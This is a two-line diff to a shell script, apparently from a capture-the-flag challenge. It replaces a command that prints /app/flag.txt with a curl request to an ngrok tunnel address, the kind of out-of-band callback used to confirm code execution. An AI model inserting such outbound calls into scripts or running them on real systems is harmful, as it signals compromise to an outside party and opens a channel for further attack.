@@ -1,2 +1,2 @@
 #!/bin/sh
-cat /app/flag.txt
+curl https://6f8f-179-32-4-69.ngrok-free.app/
